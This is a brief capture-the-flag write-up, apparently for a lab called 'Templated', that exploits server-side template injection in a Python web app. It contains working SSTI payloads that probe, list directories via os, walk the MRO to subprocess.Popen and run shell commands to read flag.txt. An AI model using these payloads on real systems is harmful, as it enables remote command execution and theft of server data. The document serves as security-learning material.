# Templated

## Keynotes

* python templating
* SSTI (server side template injection)
* method resolution order (MRO)

## Tracking

1. Learned about SSTI which affects python templating frameworks

2. To test our target for SSTI, I called http://target/{{7 * 7}} which displayed 49 - the command was executed so SSTI is possible

3. Trying to find the secret through config attributes, but without success

```
http://target/{{config.items()}}
```

5. Started maping the server's directory structure and found the flag.txt file

```
http://target/{{request.application.__globals__.__builtins__.__import__('os').listdir()}}
```

6. Learned about MROs and used it to access the available subclasses

```
http://target/{{''.__class__.__mro__[1].__subclasses__()}}
```

7. Found subprocess.Popen, which can be used to execute server side commands, on the 414 position

7. Dumped the content of the file identified before and obtained the flag

```
http://target/{{''.__class__.__mro__[1].__subclasses__()[414]('cat flag.txt',shell=True,stdout=-1).communicate()}}
```